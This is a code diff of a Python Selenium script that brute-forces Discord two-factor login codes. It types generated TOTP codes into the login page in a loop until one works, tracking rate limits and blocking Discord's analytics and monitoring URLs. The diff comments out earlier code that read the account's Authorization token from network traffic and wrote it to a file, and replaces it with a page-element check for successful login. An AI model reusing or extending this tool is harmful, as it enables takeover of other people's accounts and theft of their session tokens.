@@ -3,36 +3,40 @@ import time
 import secrets
 from src.lib.codegen import generate_random_code
 from src.lib.textcolor import color
+import json
 
 # Import Selenium libraries and dependencies
-from seleniumwire import webdriver
-from selenium.webdriver.common.keys import Keys
-from selenium.common.exceptions import NoSuchElementException, NoSuchWindowException
 from webdriver_manager.chrome import ChromeDriverManager
+
+import selenium.webdriver
+from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 
-def bootstrap_browser(configuration: dict) -> webdriver.chrome.webdriver.WebDriver:
+from selenium.common.exceptions import NoSuchElementException, NoSuchWindowException
+
+def bootstrap_browser(configuration: dict) -> selenium.webdriver.chrome.webdriver.WebDriver:
 	"""
 	bootstrap_browser is a function that initializes and returns a WebDriver object of the Chrome browser. 
 	:param configuration: a dictionary object which holds the program mode as key-value pairs. 
 	:type configuration: dict
 	:return: a WebDriver object of the Chrome browser.
-	:rtype: webdriver.chrome.webdriver.WebDriver
+	:rtype: selenium.webdriver.chrome.webdriver.WebDriver
 	"""
 	# Set Chromium options.
 	options = Options()
 	options.add_experimental_option('excludeSwitches', ['enable-logging'])
 	options.add_experimental_option(         'detach', True)
 	options.add_argument("--lang=en-US") # Force the browser window into English so we can find the code XPATH
+	options.set_capability('goog:loggingPrefs', {'performance': 'ALL', "browser": "ALL"})
 
 	# If you want to run the program without the browser opening then remove the # from the options below 
 	#options.add_argument('--headless')
 	#options.add_argument('--log-level=1')
 
 	# Get and initialize the most up-to-date Chromium web driver
-	driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+	driver = selenium.webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
 
 	#Blocking various Discord analytics/monitoring URLS so they don't phone home
 	driver.execute_cdp_cmd('Network.setBlockedURLs', {
@@ -61,7 +65,7 @@ def bootstrap_browser(configuration: dict) -> webdriver.chrome.webdriver.WebDriv
 	driver.implicitly_wait(1)
 	return driver
 
-def bootstrap_login_page(driver: webdriver.chrome.webdriver.WebDriver, configuration: dict):
+def bootstrap_login_page(driver: selenium.webdriver.chrome.webdriver.WebDriver, configuration: dict):
 	"""
 	Login Bootstrap is a function that takes in two parameters:
 	1. driver: A web driver object of Chrome
@@ -142,14 +146,14 @@ def print_session_statistics(halt_reason: str, session_statistics: dict):
 	print(color(f"Time elapsed for codes: {       session_statistics['elapsedTime']}", 'blue'))
 	print(color(f"Number of ratelimits    {    session_statistics['ratelimitCount']}", 'blue'))
 
-def code_entry(driver: webdriver.chrome.webdriver.WebDriver, login_fields: dict, configuration: dict):
+def code_entry(driver: selenium.webdriver.chrome.webdriver.WebDriver, login_fields: dict, configuration: dict):
 	try:
 		"""
 		Enter OTP codes continuously until successful login, using the provided webdriver, 
 		loginFields dictionary, and configuration dictionary. Returns nothing. 
 
 		:param driver: A webdriver object.
-		:type driver: webdriver.chrome.webdriver.WebDriver
+		:type driver: selenium.webdriver.chrome.webdriver.WebDriver
 		:param loginFields: A dictionary of login fields.
 		:type loginFields: dict
 		:param configuration: A dictionary of configuration values.
@@ -230,14 +234,33 @@ def code_entry(driver: webdriver.chrome.webdriver.WebDriver, login_fields: dict,
 			try:
 				# Testing for if the Account Token appears in network requests.
 				# The presence of this account token indicates that the login worked, and the session is authenticated.
-				account_token = driver.last_request.headers['Authorization']
+				#logs = [json.loads(lr["message"])["message"] for lr in driver.get_log("performance")]
+#
+				#def log_filter(log_):
+				#	return (
+				#		# is an actual response
+				#		log_["method"] == "Network.responseReceived"
+				#		# and json
+				#		and "json" in log_["params"]["response"]["mimeType"]
+				#	)
+#
+				#for log in filter(log_filter, logs):
+				#	request_id = log["params"]["requestId"]
+				#	resp_url = log["params"]["response"]["url"]
+				#	print(f"Caught {resp_url}")
+				#	print(driver.execute_cdp_cmd("Network.getResponseBody", {"requestId": request_id}))
+#
+				#account_token = driver.last_request.headers['Authorization']
+
+				# Wait 1 second, then check if the Discord App's HTML loaded by it's CSS class name. If loaded, then output it to the user.
+				loginTest = driver.find_element(by=By.CLASS_NAME, value='app-2CXKsg')
 				driver.implicitly_wait(1)
 				print(color(f"Code {totp_code} worked!", 'green'))
 				# Save the account token for future use by the user
-				print(f'Your account\'s auth code/token is: {color(account_token, "green")}')
-				with open('user/account_token.txt', 'w') as f: f.write(account_token)
+				#print(f'Your account\'s auth code/token is: {color(account_token, "green")}')
+				#with open('user/account_token.txt', 'w') as f: f.write(account_token)
 				break
-			except KeyError: # This means that the login was unsuccessful so let's inform the user and wait.
+			except (KeyError, TypeError): # This means that the login was unsuccessful so let's inform the user and wait.
 				print(f"Code: {color(totp_code, 'blue')} did not work, delay: {color(sleep_duration_seconds, 'blue')}")
 				time.sleep(sleep_duration_seconds)
 				# Backspace the previously entered TOTP code.
